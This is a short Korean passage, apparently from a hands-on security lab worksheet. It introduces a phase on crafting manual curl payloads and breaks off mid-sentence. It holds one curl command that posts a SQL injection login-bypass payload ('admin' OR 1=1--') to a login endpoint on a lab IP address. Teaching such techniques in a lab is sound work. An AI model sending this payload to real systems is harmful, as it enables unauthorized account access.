    ■ 임무 (3 단계, 약 35분)


    ▶ Phase A — curl 수동 페이로드 (학습 목표 #4 — curl 고급)

    `curl -s -i -X POST -d "email=admin''%20OR%201=1--&password=x" http://10.20.30.80/rest/user/login`
    형태로

